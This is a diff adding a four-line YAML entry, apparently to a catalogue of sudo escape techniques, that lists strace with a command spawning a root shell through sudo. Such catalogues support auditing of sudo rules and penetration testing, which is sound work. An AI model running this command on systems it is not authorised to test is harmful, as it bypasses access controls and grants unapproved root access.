@@ -1,0 +1,4 @@
+name: strace
+binary_path: /usr/bin/strace
+exploit_cmds:
+- sudo /usr/bin/strace -o /dev/null /bin/sh
